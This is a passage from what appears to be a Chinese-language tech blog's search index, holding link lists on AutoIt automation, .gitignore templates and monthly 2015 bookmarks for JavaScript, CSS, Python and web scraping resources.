href=\"https://blog.xuite.net/josephtsai1126/wretch/193271565-AutoIT+%E8%87%AA%E5%8B%95%E5%8C%96%E5%AE%8C%E6%88%90%E7%A8%8B%E5%BC%8F%E5%AE%89%E8%A3%9D\" target=\"_blank\" rel=\"noopener\">AutoIT 自動化完成程式安裝 @ JosephPhoto 的 網路日誌我的網誌 :: 隨意窩 Xuite日誌</a></li>\n</ul>\n<p>管理者模式</p>\n<ul>\n<li><a href=\"https://www.autoitscript.com/autoit3/docs/keywords/RequireAdmin.htm\" target=\"_blank\" rel=\"noopener\">Keyword #RequireAdmin</a></li>\n<li><a href=\"https://www.autoitscript.com/forum/topic/134675-run-as-administrator/\" target=\"_blank\" rel=\"noopener\">Run as administrator ? - AutoIt General Help and Support - AutoIt Forums</a></li>\n<li><a href=\"https://ithelp.ithome.com.tw/questions/10185977\" target=\"_blank\" rel=\"noopener\">Autoit 使用 runas 執行沒有反應 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n</ul>\n<p>放大縮小</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/autotest/p/3262234.html\" target=\"_blank\" rel=\"noopener\">AutoIT: WinSetState可以定义窗口大小 - chenpassion - 博客园</a></li>\n</ul>\n<p>其他</p>\n<ul>\n<li><a href=\"https://github.com/J2TEAM/awesome-AutoIt\" target=\"_blank\" rel=\"noopener\">J2TEAM/awesome-AutoIt: A curated list of awesome UDFs, example scripts, tools and useful resources for AutoIt.</a></li>\n</ul>\n<p>FileInstall </p>\n<p>編譯 exe </p>\n<ul>\n<li><a href=\"http://pentiumto.blogspot.com/2017/07/autoit_5.html\" target=\"_blank\" rel=\"noopener\">奔騰兔分享誌: AutoIt 執行外部程式進階應用</a></li>\n</ul>\n<p>通知</p>\n<p><a href=\"https://www.autoitscript.com/autoit3/docs/functions/TrayTip.htm\" target=\"_blank\" rel=\"noopener\">Function TrayTip</a></p>\n<p>filedelete 跟暫存路徑</p>\n<p><a href=\"https://www.autoitscript.com/autoit3/docs/functions/FileDelete.htm\" target=\"_blank\" rel=\"noopener\">Function FileDelete</a><br><a href=\"https://www.autoitscript.com/autoit3/docs/libfunctions/_WinAPI_GetTempFileName.htm\" target=\"_blank\" rel=\"noopener\">Function _WinAPI_GetTempFileName</a></p>\n<p>程式是否開啟<br><a href=\"https://www.autoitscript.com/autoit3/docs/functions/ProcessExists.htm\" target=\"_blank\" rel=\"noopener\">Function ProcessExists</a><br><a href=\"https://www.autoitscript.com/forum/topic/71544-terminate-process/\" target=\"_blank\" rel=\"noopener\">terminate process? - AutoIt General Help and Support - AutoIt Forums</a></p>\n","categories":["AutoIt"],"tags":["自動化","AutoIt"]},{"title":"程式專案使用git的.gitignore設定","url":"/blog/2014/12/29/logdown/2014-12-29-program-projects-using-git-gitignore-set/","content":"<p><a href=\"https://github.com/crilleengvall/gitignore/blob/master/Phonegap.gitignore\" target=\"_blank\" rel=\"noopener\">https://github.com/crilleengvall/gitignore/blob/master/Phonegap.gitignore</a><br><a href=\"https://github.com/crilleengvall/gitignore\" target=\"_blank\" rel=\"noopener\">https://github.com/crilleengvall/gitignore</a><br><a href=\"https://www.gitignore.io/\" target=\"_blank\" rel=\"noopener\">gitignore.io - Create Useful .gitignore Files For Your Project</a></p>\n<p>參考來源：<br>.gitignore for PhoneGap/Cordova 3.0 projects - what should I commit?<br><a href=\"http://stackoverflow.com/questions/17911204/gitignore-for-phonegap-cordova-3-0-projects-what-should-i-commit\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/17911204/gitignore-for-phonegap-cordova-3-0-projects-what-should-i-commit</a></p>\n","categories":["Git"],"tags":["git","gitignore"]},{"title":"2015 隨意筆記紀錄","url":"/blog/2015/01/05/logdown/2015-01-05-2015-random-notes/","content":"<p><a href=\"230753-2014-random-notes\">←2014隨意筆記紀錄</a><br>新的一年…新的開始。</p>\n<a id=\"more\"></a>\n<p>201501</p>\n<p>之前2014年看到的滾動適窗skrollr.js，最近又看到幾個<br><a href=\"http://blog.friendo.com.tw/posts/240944-prallax-scrolling-by-skrollr\" target=\"_blank\" rel=\"noopener\">http://blog.friendo.com.tw/posts/240944-prallax-scrolling-by-skrollr</a></p>\n<p>scrollReveal.js<br><a href=\"http://scrollrevealjs.org/\" target=\"_blank\" rel=\"noopener\">http://scrollrevealjs.org/</a></p>\n<p>anijs<br><a href=\"https://github.com/anijs/examples/tree/gh-pages/scrollreveal\" target=\"_blank\" rel=\"noopener\">https://github.com/anijs/examples/tree/gh-pages/scrollreveal</a><br><a href=\"http://anijs.github.io/\" target=\"_blank\" rel=\"noopener\">http://anijs.github.io/</a><br><a href=\"http://anijs.github.io/examples/scrollreveal/\" target=\"_blank\" rel=\"noopener\">http://anijs.github.io/examples/scrollreveal/</a></p>\n<hr>\n<p>[譯]為什麼我們找不到前端工程師？<br><a href=\"https://zh-tw.facebook.com/notes/lock-chou/%E8%AD%AF%E7%82%BA%E4%BB%80%E9%BA%BC%E6%88%91%E5%80%91%E6%89%BE%E4%B8%8D%E5%88%B0%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%AB/10152095506555563\" target=\"_blank\" rel=\"noopener\">https://zh-tw.facebook.com/notes/lock-chou/%E8%AD%AF%E7%82%BA%E4%BB%80%E9%BA%BC%E6%88%91%E5%80%91%E6%89%BE%E4%B8%8D%E5%88%B0%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%AB/10152095506555563</a></p>\n<p>Rightjs<br><a href=\"http://rightjs.org/\" target=\"_blank\" rel=\"noopener\">http://rightjs.org/</a></p>\n<p>學習 JavaScript<br><a href=\"https://developer.mozilla.org/zh-TW/learn/javascript\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-TW/learn/javascript</a></p>\n<p>jQuery Cookie 使用注意事項<br><a href=\"http://jocoomadao.logdown.com/posts/249883-jquery-cookie-usage-considerations\" target=\"_blank\" rel=\"noopener\">http://jocoomadao.logdown.com/posts/249883-jquery-cookie-usage-considerations</a></p>\n<p>難搞的 windows 系統 安裝 sass 篇<br><a href=\"http://jamestw.logdown.com/posts/250160-difficult-sass-installed-windows-system-article\" target=\"_blank\" rel=\"noopener\">http://jamestw.logdown.com/posts/250160-difficult-sass-installed-windows-system-article</a></p>\n<p>Lumx<br><a href=\"http://ui.lumapps.com/\" target=\"_blank\" rel=\"noopener\">http://ui.lumapps.com/</a></p>\n<p>AngularjsHub<br><a href=\"http://www.angularjshub.com/\" target=\"_blank\" rel=\"noopener\">http://www.angularjshub.com/</a></p>\n<p>Python-split (第二參數)<br><a href=\"http://kevingo.logdown.com/posts/251938-pythons-split\" target=\"_blank\" rel=\"noopener\">http://kevingo.logdown.com/posts/251938-pythons-split</a></p>\n<p>前進 RWD Grid 設計 - 談Photoshop CS5 網格設計擴充<br><a href=\"http://adon988.logdown.com/posts/251966-rwd-grid-design-on-the-fence-design-ready-to-what\" target=\"_blank\" rel=\"noopener\">http://adon988.logdown.com/posts/251966-rwd-grid-design-on-the-fence-design-ready-to-what</a></p>\n<p>[jQuery]使用jQuery對 select 的操作<br><a href=\"http://www.dotblogs.com.tw/alanjiang/archive/2011/01/26/21061.aspx\" target=\"_blank\" rel=\"noopener\">http://www.dotblogs.com.tw/alanjiang/archive/2011/01/26/21061.aspx</a></p>\n<p>給 Gradle 入門者的 Groovy 語言特性介紹<br><a href=\"http://cloudchen.logdown.com/posts/248361/features-of-groovy-for-gradle-beginner\" target=\"_blank\" rel=\"noopener\">http://cloudchen.logdown.com/posts/248361/features-of-groovy-for-gradle-beginner</a></p>\n<p>爬蟲服務也上雲端，Kimono讓所有網站都API化<br><a href=\"http://www.ithome.com.tw/news/93694\" target=\"_blank\" rel=\"noopener\">http://www.ithome.com.tw/news/93694</a></p>\n<p>用「Kimono」製作自己的網路爬蟲！<br><a href=\"http://typecurry.pixnet.net/blog/post/30665638\" target=\"_blank\" rel=\"noopener\">http://typecurry.pixnet.net/blog/post/30665638</a></p>\n<p>Json Web Crawler: 簡化寫爬蟲的 code<br><a href=\"http://knovourland.logdown.com/posts/252329-json-web-crawler\" target=\"_blank\" rel=\"noopener\">http://knovourland.logdown.com/posts/252329-json-web-crawler</a></p>\n<h2 id=\"201502\"><a href=\"#201502\" class=\"headerlink\" title=\"201502\"></a>201502</h2><p>[CSS]利用CSS製作簡單Tooltip效果<br><a href=\"http://monkeybinbin-blog.logdown.com/posts/253999-css-use-css-to-create-a-simple-tooltip-effect\" target=\"_blank\" rel=\"noopener\">http://monkeybinbin-blog.logdown.com/posts/253999-css-use-css-to-create-a-simple-tooltip-effect</a></p>\n<p>[JS]Websocket with PHP Socket<br><a href=\"http://penyin.logdown.com/posts/253523\" target=\"_blank\" rel=\"noopener\">http://penyin.logdown.com/posts/253523</a></p>\n<p>WebSocket 簡單介紹與 jQuery 實作應用 (手機與電腦結合運用)<br><a href=\"http://blog.mukispace.com/websocket-simple-introduce-and-use/\" target=\"_blank\" rel=\"noopener\">http://blog.mukispace.com/websocket-simple-introduce-and-use/</a></p>\n<p>GIT<br><a href=\"http://baleezo.logdown.com/posts/253386\" target=\"_blank\" rel=\"noopener\">http://baleezo.logdown.com/posts/253386</a></p>\n<p>Modernizr.js 判斷是否支援HTML 5功能<br><a href=\"http://wd-blog.logdown.com/posts/254018-modernizrjs-to-determine-whether-to-support-html-5-features\" target=\"_blank\" rel=\"noopener\">http://wd-blog.logdown.com/posts/254018-modernizrjs-to-determine-whether-to-support-html-5-features</a></p>\n<p>yepnope.js – 異步加載資源文件<br><a href=\"http://wd-blog.logdown.com/posts/254016-yepnopejs-asynchronous-loading-of-resources-files\" target=\"_blank\" rel=\"noopener\">http://wd-blog.logdown.com/posts/254016-yepnopejs-asynchronous-loading-of-resources-files</a></p>\n<p>head.js 讓網站並行加載但順序執行JS<br><a href=\"http://wd-blog.logdown.com/posts/254015-headjs-website-of-parallel-loads-but-the-order-executes-js\" target=\"_blank\" rel=\"noopener\">http://wd-blog.logdown.com/posts/254015-headjs-website-of-parallel-loads-but-the-order-executes-js</a></p>\n<p>html5up 網頁樣版網站<br><a href=\"http://html5up.net\" target=\"_blank\" rel=\"noopener\">http://html5up.net</a></p>\n<p>工作必備七萬 clip art 小插圖！最大美工圖庫免費下載<br><a href=\"http://www.playpcesor.com/2015/02/clip-art-free-download.html\" target=\"_blank\" rel=\"noopener\">http://www.playpcesor.com/2015/02/clip-art-free-download.html</a></p>\n<p>Scrollex<br><a href=\"http://n33.co/scrollex\" target=\"_blank\" rel=\"noopener\">http://n33.co/scrollex</a></p>\n<p>Scrolly: a simple jQuery parallax plugin<br><a href=\"http://lab.victorcoulon.fr/javascript/scrolly/\" target=\"_blank\" rel=\"noopener\">http://lab.victorcoulon.fr/javascript/scrolly/</a></p>\n<p>Another 20 Docs and Guides for Front-End Developers<br><a href=\"http://www.sitepoint.com/another-20-docs-guides-front-end-developers/\" target=\"_blank\" rel=\"noopener\">http://www.sitepoint.com/another-20-docs-guides-front-end-developers/</a></p>\n<p>OOCSS——概念篇   <em>※</em><br><a href=\"http://www.w3cplus.com/css/oocss-concept\" target=\"_blank\" rel=\"noopener\">http://www.w3cplus.com/css/oocss-concept</a></p>\n<h2 id=\"201503\"><a href=\"#201503\" class=\"headerlink\" title=\"201503\"></a>201503</h2><p>How to: CSS Large Background<br><a href=\"http://webdesignerwall.com/tutorials/how-to-css-large-background\" target=\"_blank\" rel=\"noopener\">http://webdesignerwall.com/tutorials/how-to-css-large-background</a></p>\n<p>技能樹<br><a href=\"https://raw.githubusercontent.com/justjavac/awesome-awesomeness-zh_CN/master/assets/php-mind-map.jpg\" target=\"_blank\" rel=\"noopener\">https://raw.githubusercontent.com/justjavac/awesome-awesomeness-zh_CN/master/assets/php-mind-map.jpg</a></p>\n<p>在Python中如何Async的方式呼叫外部程式<br><a href=\"http://blog.codylab.com/python-creationflags/\" target=\"_blank\" rel=\"noopener\">http://blog.codylab.com/python-creationflags/</a></p>\n<p>Windows 7 使用指令讓它預約關機!<br><a href=\"http://dreamtails.pixnet.net/blog/post/26178309\" target=\"_blank\" rel=\"noopener\">http://dreamtails.pixnet.net/blog/post/26178309</a></p>\n<p>Stylify Me<br><a href=\"http://stylifyme.com/\" target=\"_blank\" rel=\"noopener\">http://stylifyme.com/</a></p>\n<p>Python2和Python3解惑<br><a href=\"http://lovelock-blog.logdown.com/posts/257482-python2-and-python3-faq\" target=\"_blank\" rel=\"noopener\">http://lovelock-blog.logdown.com/posts/257482-python2-and-python3-faq</a></p>\n<p>Font Awesome<br><a href=\"http://fortawesome.github.io/Font-Awesome/\" target=\"_blank\" rel=\"noopener\">http://fortawesome.github.io/Font-Awesome/</a><br><a href=\"http://lsinyi-blog.logdown.com/posts/257480-font-awesome-icon-with-css-using-teaching\" target=\"_blank\" rel=\"noopener\">http://lsinyi-blog.logdown.com/posts/257480-font-awesome-icon-with-css-using-teaching</a></p>\n<p>catfan.me</p>\n<ul>\n<li>Qatrix(輕量級高性能 JavaScript 框架 )<br><a href=\"http://qatrix.com/\" target=\"_blank\" rel=\"noopener\">http://qatrix.com/</a></li>\n<li>Medoo (PHP SQL 數據庫框架)<br><a href=\"http://medoo.in/\" target=\"_blank\" rel=\"noopener\">http://medoo.in/</a></li>\n</ul>\n<p>用 data-* 屬性做出純 CSS 的 tooltip<br><a href=\"http://blog.mukispace.com/pure-css-tooltip-data-tag/\" target=\"_blank\" rel=\"noopener\">http://blog.mukispace.com/pure-css-tooltip-data-tag/</a></p>\n<p>[CSS] 圓形圖片（更高的可自訂性）<br><a href=\"http://shinychang.net/article/53c3f1ff80e3f8c73200c0f7\" target=\"_blank\" rel=\"noopener\">http://shinychang.net/article/53c3f1ff80e3f8c73200c0f7</a></p>\n<p>程式碼準則 by @mdo<br><a href=\"http://juanitofatas.com/code-guide/\" target=\"_blank\" rel=\"noopener\">http://juanitofatas.com/code-guide/</a></p>\n<p>coServ(node.js實作精簡的 web serve)<br><a href=\"http://www.coservjs.org/coserv/manage?_loc=zh\" target=\"_blank\" rel=\"noopener\">http://www.coservjs.org/coserv/manage?_loc=zh</a></p>\n<p>10步掌握CSS定位: position static relative absolute float<br><a href=\"http://www.see-design.com.tw/i/css_position.html\" target=\"_blank\" rel=\"noopener\">http://www.see-design.com.tw/i/css_position.html</a></p>\n<p>Scripting .NET Applications with IronPython<br><a href=\"http://www.codeproject.com/Articles/602112/Scripting-NET-Applications-with-IronPython\" target=\"_blank\" rel=\"noopener\">http://www.codeproject.com/Articles/602112/Scripting-NET-Applications-with-IronPython</a></p>\n<p>C#调用Python脚本并使用Python的第三方模块<br><a href=\"http://zh.5long.me/2015/dotnet-call-python/\" target=\"_blank\" rel=\"noopener\">http://zh.5long.me/2015/dotnet-call-python/</a></p>\n<p>Alternative to execfile in Python 3.2+?<br><a href=\"http://stackoverflow.com/questions/6357361/alternative-to-execfile-in-python-3-2\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/6357361/alternative-to-execfile-in-python-3-2</a></p>\n<p>[Tool]Sublime Text 3安裝相關資紀錄(for Windows)<br><a href=\"http://monkeybinbin-blog.logdown.com/posts/258838-tool-sublime-text-3-installation-related-funding-record\" target=\"_blank\" rel=\"noopener\">http://monkeybinbin-blog.logdown.com/posts/258838-tool-sublime-text-3-installation-related-funding-record</a></p>\n<p>terrarium<br><a href=\"http://www.terrariumapp.com/\" target=\"_blank\" rel=\"noopener\">http://www.terrariumapp.com/</a></p>\n<h2 id=\"201504\"><a href=\"#201504\" class=\"headerlink\" title=\"201504\"></a>201504</h2><p>[jQuery] 倒數計時(還有X天X時X分X秒)<br><a href=\"http://blog.patw.me/archives/198/jquery-countdown-as-well-as-x-x-x-minutes-x-seconds/\" target=\"_blank\" rel=\"noopener\">http://blog.patw.me/archives/198/jquery-countdown-as-well-as-x-x-x-minutes-x-seconds/</a><br>jQuery Timer Plugin<br><a href=\"http://darkk6.blogspot.tw/2012/06/jquery-timer-plugin.html\" target=\"_blank\" rel=\"noopener\">http://darkk6.blogspot.tw/2012/06/jquery-timer-plugin.html</a></p>\n<p>CSS Diner<br><a href=\"http://flukeout.github.io/\" target=\"_blank\" rel=\"noopener\">http://flukeout.github.io/</a><br>CSS Diner 攻略  (其實不只一種答案)<br><a href=\"http://railsfun.tw/t/css-diner/63\" target=\"_blank\" rel=\"noopener\">http://railsfun.tw/t/css-diner/63</a></p>\n<p>python dict按照value 排序<br><a href=\"http://hi.baidu.com/jackleehit/item/348a312f4c4c68f051fd876e\" target=\"_blank\" rel=\"noopener\">http://hi.baidu.com/jackleehit/item/348a312f4c4c68f051fd876e</a></p>\n<p>Javascript - Bubbling V.S Capturing<br><a href=\"http://mrjumpy-blog.logdown.com/posts/259761-javascript-event-bubbling-vs-event-capturing\" target=\"_blank\" rel=\"noopener\">http://mrjumpy-blog.logdown.com/posts/259761-javascript-event-bubbling-vs-event-capturing</a></p>\n<p><a href=\"http://codepen.io/jakealbaugh/full/PwLXXP\" target=\"_blank\" rel=\"noopener\">http://codepen.io/jakealbaugh/full/PwLXXP</a></p>\n<p>想學程式設計，你怎麼能錯過這 31 個學 Coding 的網站<br><a href=\"http://buzzorange.com/techorange/2014/03/27/best-resources-to-learn-code/\" target=\"_blank\" rel=\"noopener\">http://buzzorange.com/techorange/2014/03/27/best-resources-to-learn-code/</a></p>\n<p>Javascript 日期處理<br><a href=\"http://jerry80409.logdown.com/posts/259925\" target=\"_blank\" rel=\"noopener\">http://jerry80409.logdown.com/posts/259925</a></p>\n<p>Python Tutorial 第二堂（3）函式、模組、類別與套件<br><a href=\"http://www.codedata.com.tw/python/python-tutorial-the-2nd-class-3-function-module-class-package/\" target=\"_blank\" rel=\"noopener\">http://www.codedata.com.tw/python/python-tutorial-the-2nd-class-3-function-module-class-package/</a></p>\n<p>製作免安裝程式<br>Cameyo<br><a href=\"http://blog.joaoko.net/archives/3533\" target=\"_blank\" rel=\"noopener\">http://blog.joaoko.net/archives/3533</a><br>VMware Thinapp<br><a href=\"http://defeatshame.blogspot.com/2010/12/vmware-thinapp-office-2010.html\" target=\"_blank\" rel=\"noopener\">http://defeatshame.blogspot.com/2010/12/vmware-thinapp-office-2010.html</a></p>\n<p>SQL injection duplicate error<br><a href=\"http://vancelin.logdown.com/posts/260140-sql-injection-duplicate-error\" target=\"_blank\" rel=\"noopener\">http://vancelin.logdown.com/posts/260140-sql-injection-duplicate-error</a></p>\n<p>Django Girls 教學手冊<br><a href=\"http://djangogirlstaipei.herokuapp.com/tutorials/?hc_location=ufi\" target=\"_blank\" rel=\"noopener\">http://djangogirlstaipei.herokuapp.com/tutorials/?hc_location=ufi</a></p>\n<p>Fiddler(查看HTTP封包內容)<br><a href=\"http://blogs.telerik.com/fiddler/posts/15-03-30/what-s-new-in-fiddler-4-5\" target=\"_blank\" rel=\"noopener\">http://blogs.telerik.com/fiddler/posts/15-03-30/what-s-new-in-fiddler-4-5</a></p>\n<p>透過 Google Maps API 處理 GeoJSON 資料<br><a href=\"http://kuro.tw/posts/2015/04/28/through-the-google-maps-api-geojson-data\" target=\"_blank\" rel=\"noopener\">http://kuro.tw/posts/2015/04/28/through-the-google-maps-api-geojson-data</a></p>\n<p>淺談 Google map Heat map API<br><a href=\"http://kuro.tw/posts/2015/04/29/a-brief-talk-on-google-map-heat-map-api\" target=\"_blank\" rel=\"noopener\">http://kuro.tw/posts/2015/04/29/a-brief-talk-on-google-map-heat-map-api</a></p>\n<p>[note] jQuery 與 d3.js 的一些不同之處<br><a href=\"http://kuro.tw/posts/2015/04/22/note-jquery-and-d3js-some-of-these-differences\" target=\"_blank\" rel=\"noopener\">http://kuro.tw/posts/2015/04/22/note-jquery-and-d3js-some-of-these-differences</a></p>\n<h2 id=\"201505\"><a href=\"#201505\" class=\"headerlink\" title=\"201505\"></a>201505</h2><p>ready4rails4<br><a href=\"http://www.ready4rails4.net/\" target=\"_blank\" rel=\"noopener\">http://www.ready4rails4.net/</a></p>\n<p>Python 遞迴處理路徑下檔案與資料夾<br><a href=\"http://coder.aqualuna.me/2012/01/python.html\" target=\"_blank\" rel=\"noopener\">http://coder.aqualuna.me/2012/01/python.html</a></p>\n<p>Python tips: 什么是*args和**kwargs？<br><a href=\"http://www.cnblogs.com/fengmk2/archive/2008/04/21/1163766.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/fengmk2/archive/2008/04/21/1163766.html</a></p>\n<p>推薦五個熱門 Google 材質設計框架 (Material Design Framework)<br><a href=\"http://adon988.logdown.com/posts/263691-recommend-some-good-google-material-design-framework\" target=\"_blank\" rel=\"noopener\">http://adon988.logdown.com/posts/263691-recommend-some-good-google-material-design-framework</a></p>\n<p>namedtuple<br><a href=\"https://docs.python.org/3/library/collections.html#collections.namedtuple\" target=\"_blank\" rel=\"noopener\">https://docs.python.org/3/library/collections.html#collections.namedtuple</a></p>\n<p>更好的編寫Python代碼的方式<br><a href=\"http://cheng.logdown.com/posts/2015/04/24/better-way-to-write-python\" target=\"_blank\" rel=\"noopener\">http://cheng.logdown.com/posts/2015/04/24/better-way-to-write-python</a></p>\n<p>網頁工程師必知：9 個超好用的 CSS 框架<br><a href=\"http://buzzorange.com/techorange/2015/05/13/9-css-framework/\" target=\"_blank\" rel=\"noopener\">http://buzzorange.com/techorange/2015/05/13/9-css-framework/</a></p>\n<p>快看過來～推薦你 9 個最好用的 JavaScript 開發工具<br><a href=\"http://buzzorange.com/techorange/2015/03/03/9-javascript-ide-editor/\" target=\"_blank\" rel=\"noopener\">http://buzzorange.com/techorange/2015/03/03/9-javascript-ide-editor/</a></p>\n<p>Bootstrap 免費的theme<br><a href=\"http://startbootstrap.com\" target=\"_blank\" rel=\"noopener\">http://startbootstrap.com</a></p>\n<p>#繼2015/04 Fiddler，找到類似查看HTTP封包程式<br>LivePool<br><a href=\"http://code.csdn.net/news/2820655\" target=\"_blank\" rel=\"noopener\">http://code.csdn.net/news/2820655</a><br><a href=\"https://github.com/rehorn/livepool\" target=\"_blank\" rel=\"noopener\">https://github.com/rehorn/livepool</a><br>Rythem<br><a href=\"http://www.alloyteam.com/2012/05/web-front-end-tool-rythem-1/\" target=\"_blank\" rel=\"noopener\">http://www.alloyteam.com/2012/05/web-front-end-tool-rythem-1/</a></p>\n<p>Global and Local Variables (Python2)<br><a href=\"http://www.python-course.eu/global_vs_local_variables.php\" target=\"_blank\" rel=\"noopener\">http://www.python-course.eu/global_vs_local_variables.php</a></p>\n<p>Python 慣用語<br><a href=\"http://seanlin.logdown.com/posts/239883-python-idioms\" target=\"_blank\" rel=\"noopener\">http://seanlin.logdown.com/posts/239883-python-idioms</a></p>\n<p>Python之排列组合<br><a href=\"http://love67.net/2014/02/09/python-sord-combine/\" target=\"_blank\" rel=\"noopener\">http://love67.net/2014/02/09/python-sord-combine/</a></p>\n<p>Cycle through list starting at a certain element  [cycle list]<br><a href=\"http://stackoverflow.com/questions/8940737/cycle-through-list-starting-at-a-certain-element\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/8940737/cycle-through-list-starting-at-a-certain-element</a></p>\n<p>Python之排列组合<br><a href=\"http://love67.net/2014/02/09/python-sord-combine/\" target=\"_blank\" rel=\"noopener\">http://love67.net/2014/02/09/python-sord-combine/</a></p>\n<p>[pyquery] 抓網頁資料的神器<br><a href=\"http://kynix.logdown.com/posts/194930-pyquery-get-web-data-artifact\" target=\"_blank\" rel=\"noopener\">http://kynix.logdown.com/posts/194930-pyquery-get-web-data-artifact</a><br>pyquery: 基於python和jquery語法操作XML<br><a href=\"http://www.geoinformatics.cn/lab/pyquery/\" target=\"_blank\" rel=\"noopener\">http://www.geoinformatics.cn/lab/pyquery/</a></p>\n<p>phpquery<br><a href=\"http://program.faryne.tw/2012/01/phpquery.html\" target=\"_blank\" rel=\"noopener\">http://program.faryne.tw/2012/01/phpquery.html</a></p>\n<p>lmxl<br><a href=\"http://www.zhidaow.com/post/html-scraping\" target=\"_blank\" rel=\"noopener\">http://www.zhidaow.com/post/html-scraping</a></p>\n<p>Scrapy<br>scrapy.org</p>\n<h2 id=\"2015-06\"><a href=\"#2015-06\" class=\"headerlink\" title=\"2015/06\"></a>2015/06</h2><p>【程式】jQuery : 取得和設定 radio, checkbox, select 的值 (轉)<br><a href=\"http://blog.xuite.net/chingwei/blog/22969215-%E3%80%90%E7%A8%8B%E5%BC%8F%E3%80%91jQuery+%3A+%E5%8F%96%E5%BE%97%E5%92%8C%E8%A8%AD%E5%AE%9A+radio,+checkbox,+select+%E7%9A%84%E5%80%BC+%28%E8%BD%89%29\" target=\"_blank\" rel=\"noopener\">http://blog.xuite.net/chingwei/blog/22969215-%E3%80%90%E7%A8%8B%E5%BC%8F%E3%80%91jQuery+%3A+%E5%8F%96%E5%BE%97%E5%92%8C%E8%A8%AD%E5%AE%9A+radio,+checkbox,+select+%E7%9A%84%E5%80%BC+%28%E8%BD%89%29</a></p>\n<p>dbv.php<br><a href=\"http://dbv.vizuina.com/\" target=\"_blank\" rel=\"noopener\">http://dbv.vizuina.com/</a></p>\n<p> Phinx<br> <a href=\"https://phinx.org/\" target=\"_blank\" rel=\"noopener\">https://phinx.org/</a></p>\n<p> Javascript 陣列vs物件<br> <a href=\"http://guang.logdown.com/posts/278890-javascript-array-vs-object\" target=\"_blank\" rel=\"noopener\">http://guang.logdown.com/posts/278890-javascript-array-vs-object</a></p>\n<p> lambda 運算式<br> <a href=\"http://openhome.cc/Gossip/Python/LambdaExpression.html\" target=\"_blank\" rel=\"noopener\">http://openhome.cc/Gossip/Python/LambdaExpression.html</a></p>\n<p> PyUserInput<br><a href=\"https://github.com/SavinaRoja/PyUserInput\" target=\"_blank\" rel=\"noopener\">https://github.com/SavinaRoja/PyUserInput</a></p>\n<p> 中文亂碼<br> <a href=\"https://www.facebook.com/groups/pythontw/permalink/10154059772548438/\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/groups/pythontw/permalink/10154059772548438/</a><br> <a href=\"http://blog.longwin.com.tw/2014/09/python-list-print-chinese-2014/\" target=\"_blank\" rel=\"noopener\">http://blog.longwin.com.tw/2014/09/python-list-print-chinese-2014/</a></p>\n<p> JQ | stop<br> <a href=\"http://erhshe-blog.logdown.com/posts/278957-jq-stopcallback\" target=\"_blank\" rel=\"noopener\">http://erhshe-blog.logdown.com/posts/278957-jq-stopcallback</a></p>\n<p> HTML5 Attributes :placeholder 、multiple 、formtarget 、formmethod 、formaction 、autofocus<br> <a href=\"http://chc-blog.logdown.com/posts/278946-full-browser-support-property\" target=\"_blank\" rel=\"noopener\">http://chc-blog.logdown.com/posts/278946-full-browser-support-property</a></p>\n<p> Shell Script學習小記錄<br> <a href=\"http://jayden.logdown.com/posts/190019-small-shell-script-learning-record\" target=\"_blank\" rel=\"noopener\">http://jayden.logdown.com/posts/190019-small-shell-script-learning-record</a></p>\n<p> Got Your PW(專供資安人的資源與工具整理)<br> <a href=\"https://gotyour.pw/index.html\" target=\"_blank\" rel=\"noopener\">https://gotyour.pw/index.html</a></p>\n<p> Understanding Python Decorators in 12 Easy Steps!<br> <a href=\"http://simeonfranklin.com/blog/2012/jul/1/python-decorators-in-12-steps/\" target=\"_blank\" rel=\"noopener\">http://simeonfranklin.com/blog/2012/jul/1/python-decorators-in-12-steps/</a></p>\n<p>tutorialzine<br><a href=\"http://tutorialzine.com/\" target=\"_blank\" rel=\"noopener\">http://tutorialzine.com/</a></p>\n<p>[Android] volley，好用的http client library<br><a href=\"http://huli.logdown.com/posts/280423-android-volley-useful-network-related-library\" target=\"_blank\" rel=\"noopener\">http://huli.logdown.com/posts/280423-android-volley-useful-network-related-library</a></p>\n<p>(原創) 為什麼C#、Java需要提供interface? (C/C++) (.NET) (C#) (Java)<br><a href=\"http://www.cnblogs.com/oomusou/archive/2007/03/17/677832.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/oomusou/archive/2007/03/17/677832.html</a></p>\n<p>tabulate<br><a href=\"https://pypi.python.org/pypi/tabulate\" target=\"_blank\" rel=\"noopener\">https://pypi.python.org/pypi/tabulate</a></p>\n<p>玩轉 CSS 3D - 原理篇 - OXXO.STUDIO<br><a href=\"http://www.oxxostudio.tw/articles/201506/css-3d.html\" target=\"_blank\" rel=\"noopener\">http://www.oxxostudio.tw/articles/201506/css-3d.html</a></p>\n<p>Hello Backbone.js<br><a href=\"http://arturadib.com/hello-backbonejs/\" target=\"_blank\" rel=\"noopener\">http://arturadib.com/hello-backbonejs/</a></p>\n<p>Python &amp; R, for scientists<br><a href=\"https://www.getdatajoy.com/\" target=\"_blank\" rel=\"noopener\">https://www.getdatajoy.com/</a></p>\n<p>Top 10 Programming Fonts<br><a href=\"http://hivelogic.com/articles/top-10-programming-fonts\" target=\"_blank\" rel=\"noopener\">http://hivelogic.com/articles/top-10-programming-fonts</a></p>\n<p>Python Note - *args, **kwargs<br><a href=\"http://et10man-blog.logdown.com/posts/281264-python-args-kwargs\" target=\"_blank\" rel=\"noopener\">http://et10man-blog.logdown.com/posts/281264-python-args-kwargs</a></p>\n<p>Python string formatting: % vs. .format<br>stackoverflow.com/questions/5082452/python-string-formatting-vs-format</p>\n<p>[Python] 內建函式filter, map, reduce<br><a href=\"http://www.dotblogs.com.tw/law1009/archive/2013/07/09/109217.aspx\" target=\"_blank\" rel=\"noopener\">http://www.dotblogs.com.tw/law1009/archive/2013/07/09/109217.aspx</a></p>\n<h2 id=\"2015-07\"><a href=\"#2015-07\" class=\"headerlink\" title=\"2015/07\"></a>2015/07</h2><p>.bash_profile 與 .bashrc 的差異<br><a href=\"http://jamestw.logdown.com/posts/283485--bash-profile-bashrc-difference\" target=\"_blank\" 